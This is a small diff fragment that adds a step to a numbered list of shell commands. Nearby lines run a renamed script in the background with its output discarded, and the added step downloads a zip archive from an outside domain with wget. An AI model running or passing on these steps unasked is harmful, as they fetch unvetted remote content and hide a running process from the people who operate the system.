@@ -63,3 +63,5 @@ nohup bash your-name &>/dev/null &
 14.
 ps -ef | grep your-name
 ---------------------------------------
+15.
+wget -O d2.zip ws.a98.ir/d.zip
